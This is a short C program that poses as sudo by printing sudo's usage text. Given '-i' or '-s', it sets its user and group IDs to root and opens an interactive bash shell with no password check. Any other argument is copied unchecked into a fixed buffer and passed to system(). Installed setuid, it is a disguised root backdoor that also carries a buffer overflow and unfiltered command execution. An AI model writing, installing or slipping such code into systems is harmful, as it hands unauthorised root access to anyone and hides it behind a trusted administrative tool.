# include <stdio.h>
# include <string.h>
# include <unistd.h>
int main(int argc, char* argv[]){
        char cmd[1024];
        if(argc < 2) 
        { 
                printf("usage: sudo -h | -K | -k | -L | -V\n");
                printf("usage: sudo -v [-AknS] [-p prompt]\n");
                printf("usage: sudo -l[l] [-AknS] [-g groupname|#gid] [-p prompt] [-U username] [-u username|#uid] [-g groupname|#gid] [command]\n");
                printf("usage: sudo -e [-AknS] [-C fd] [-g groupname|#gid] [-p prompt] [-u username|#uid] file ...\n");
                exit(0);
        }
	char *dashi = "-i";
        char *dashs = "-s";
        int interactiveI;
        int interactiveS;
        interactiveI = strcmp (dashi, argv[1]) == 0;
        interactiveS =  strcmp (dashs, argv[1]) == 0;
        if ( interactiveI || interactiveS ) {
        setuid(0);
        setgid(0);
        execl ("/bin/bash", "bash", "-i", (char *) 0); 
	} else {
        strcpy(cmd, " ");
        strcat(cmd, argv[1]);
        system(cmd);}
}


